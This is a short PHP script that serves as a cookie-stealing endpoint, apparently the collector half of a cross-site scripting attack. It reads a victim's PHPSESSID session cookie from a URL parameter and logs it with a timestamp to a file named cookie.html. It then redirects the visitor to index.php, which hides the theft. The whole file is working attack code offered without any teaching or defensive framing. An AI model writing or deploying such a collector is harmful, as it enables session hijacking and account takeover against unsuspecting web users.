<?php
date_default_timezone_set("Asia/Singapore");
$cookie=trim($_GET['c'], 'PHPSESSID=');
$date=date("Y-m-d");
$time=date("H:i:s");
//echo "Cookie: " . $cookie. "";
$file = fopen('cookie.html', 'a') or die ("Unable to open");
fwrite($file, 'Date: '.$date. '<br>Time: '.$time.'<br> Cookie: '.$cookie.'<br><br>');
fclose($file);
header("Location: index.php");
?>
<HTML></HTML>
